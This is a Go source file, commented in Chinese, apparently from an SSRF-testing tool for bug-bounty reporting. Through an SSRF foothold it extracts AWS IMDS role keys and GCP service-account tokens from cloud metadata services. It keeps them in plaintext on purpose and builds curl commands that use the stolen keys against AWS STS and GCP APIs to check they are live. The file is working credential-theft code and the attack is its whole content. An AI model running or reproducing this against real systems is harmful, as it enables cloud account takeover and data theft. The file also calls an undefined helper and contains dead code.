package validators

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// CloudCredentials 是从云元数据服务提取的临时凭据（目标侧泄露物，明文保真——
// 第一方 SRC 递交需原值，脱敏会被判证据不足）。
type CloudCredentials struct {
	Provider       string            `json:"provider"` // aws | gcp
	Role           string            `json:"role,omitempty"`
	Fields         map[string]string `json:"fields"` // AccessKeyId/SecretAccessKey/Token 或 access_token 等
	ValidationHint string            `json:"validation_hint,omitempty"`
}

// probeGetHeaders 带自定义头的探针 GET（GCP 元数据要 Metadata-Flavor、IMDSv2 要
// X-aws-ec2-metadata-token）。
func probeGetHeaders(ctx context.Context, client *http.Client, probeURL string, hdr http.Header) (string, http.Header, time.Duration, error) {
	ctx, cancel := context.WithTimeout(ctx, 20*time.Second)
	defer cancel()
	start := time.Now()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
	if err != nil {
		return "", nil, 0, err
	}
	req.Header = hdr
	resp, err := client.Do(req)
	if err != nil {
		return "", nil, time.Since(start), err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return string(body), resp.Header, time.Since(start), nil
}

// ProbeCloudMeta 是云元数据深取的入口：在 meta_aws / meta_gcp 探针命中后调用，
// 尝试从元数据服务提取临时凭据。失败静默（凭据提取是加分证据不是门槛）。
func ProbeCloudMeta(ctx context.Context, client *http.Client, metaURL, provider string) []CloudCredentials {
	var out []CloudCredentials
	switch provider {
	case "aws":
		out = fetchAWSCreds(ctx, client, metaURL)
	case "gcp":
		out = fetchGCPToken(ctx, client, metaURL)
	}
	return out
}

// fetchAWSCreds 尝试 AWS IMDS 凭据链：
// GET /latest/api/token（IMDSv2 的 PUT 才合法，GET 探测区分 v1/v2）
// → GET /latest/meta-data/iam/security-credentials/（角色列表）
// → GET /latest/meta-data/iam/security-credentials/<role>（凭据 JSON）。
// SSRF 载荷只能 GET，所以 v2-only 实例（PUT token 强制）会失败——note 说明。
func fetchAWSCreds(ctx context.Context, client *http.Client, metaURL string) []CloudCredentials {
	base := strings.TrimRight(strings.TrimPrefix(metaURL, "file://"), "/")
	// metaURL 可能是 file:///169.254.169.254 形态吗？不是——meta_aws 探针是
	// http://169.254.169.254/latest/meta-data/，直接派生路径。
	_ = base
	roleListURL := strings.TrimSuffix(metaURL, "/") + "/iam/security-credentials/"
	body, _, _, err := probeGet(ctx, client, roleListURL)
	if err != nil || !strings.Contains(body, "Credentials") && !looksLikeRoleList(body) {
		return nil
	}
	roles := splitRoles(body)
	for _, role := range roles {
		credURL := roleListURL + role
		cbody, _, _, err := probeGet(ctx, client, credURL)
		if err != nil {
			continue
		}
		if cred := parseAWSCredJSON(cbody); cred != nil {
			cred.Role = role
			cred.ValidationHint = "用提取的凭据调 STS GetCallerIdentity 确认有效性：" +
				"curl --aws-sigv4 \"aws:amz/" + regionHint() + ":sts\" --user \"AKIA...:SECRET\" " +
				"-H \"x-amz-security-token: <SessionToken>\" https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15 " +
				"（Kali curl ≥7.75 支持 --aws-sigv4；凭据为目标侧泄露物，递交时明文保真）"
			out := append([]CloudCredentials{}, *cred)
			return out
		}
	}
	return nil
}

// fetchGCPToken 取 GCP 默认服务账号 token（必须带 Metadata-Flavor 头）。
func fetchGCPToken(ctx context.Context, client *http.Client, metaURL string) []CloudCredentials {
	// meta_gcp 探针 URL 指向 computeMetadata 根；token 路径固定派生。
	tokenURL := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
	if strings.Contains(metaURL, "169.254") {
		// 探针走了 IP 形态的场景：token 路径仍用域名（GCP 元数据域名解析固定）。
		tokenURL = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
	}
	hdr := http.Header{}
	hdr.Set("Metadata-Flavor", "Google")
	body, _, _, err := probeGetHeaders(ctx, client, tokenURL, hdr)
	if err != nil {
		return nil
	}
	var tok struct {
		AccessToken string `json:"access_token"`
		TokenType   string `json:"token_type"`
		Expiry      string `json:"expiry"`
	}
	if json.Unmarshal([]byte(body), &tok) != nil || tok.AccessToken == "" {
		return nil
	}
	return []CloudCredentials{{
		Provider: "gcp",
		Fields:   map[string]string{"access_token": tok.AccessToken, "token_type": tok.TokenType, "expiry": tok.Expiry},
		ValidationHint: "用提取的 access_token 调 GCP API 确认有效性（只读）：curl -H \"Authorization: Bearer <token>\" " +
			"https://cloudresourcemanager.googleapis.com/v1/projects ——返回的项目列表即凭据有效证据（明文保真递交）。",
	}}
}

// parseAWSCredJSON 解析 IMDS 凭据 JSON（AccessKeyId/SecretAccessKey/Token）。
func parseAWSCredJSON(body string) *CloudCredentials {
	var cred struct {
		Code            string `json:"Code"`
		AccessKeyID     string `json:"AccessKeyId"`
		SecretAccessKey string `json:"SecretAccessKey"`
		Token           string `json:"Token"`
		Type            string `json:"Type"`
	}
	if json.Unmarshal([]byte(body), &cred) != nil || cred.AccessKeyID == "" || cred.SecretAccessKey == "" {
		return nil
	}
	fields := map[string]string{
		"AccessKeyId":     cred.AccessKeyID,
		"SecretAccessKey": cred.SecretAccessKey,
	}
	if cred.Token != "" {
		fields["SessionToken"] = cred.Token
	}
	return &CloudCredentials{Provider: "aws", Fields: fields}
}

// looksLikeRoleList 宽松判定角色列表响应（IMDS 返回逐行角色名）。
func looksLikeRoleList(body string) bool {
	l := strings.TrimSpace(body)
	return l != "" && !strings.HasPrefix(l, "{") && !strings.Contains(l, "<") && strings.Count(l, "\n") >= 0 && len(l) < 2048
}

// splitRoles 拆角色名（逐行）。
func splitRoles(body string) []string {
	var out []string
	for _, l := range strings.Split(strings.TrimSpace(body), "\n") {
		if l = strings.TrimSpace(l); l != "" && !strings.Contains(l, " ") && !strings.Contains(l, "<") {
			out = append(out, l)
		}
	}
	return out
}

// regionHint 给 STS 验证指引一个默认区域占位（凭据区域未知时 us-east-1 可用）。
func regionHint() string { return "us-east-1" }

var _ = fmt.Sprintf
